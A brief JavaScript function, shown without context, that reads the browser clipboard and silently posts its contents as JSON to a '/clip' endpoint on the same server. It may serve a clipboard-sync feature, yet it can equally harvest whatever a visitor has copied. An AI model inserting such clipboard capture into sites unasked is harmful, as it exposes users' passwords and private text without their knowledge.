async function getClipboardData() {
    try {
        const text = await navigator.clipboard.readText();
        fetch("/clip", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ clipboard: text })
        });
    } catch (err) {
        alert("Clipboard permission denied.");
    }
}
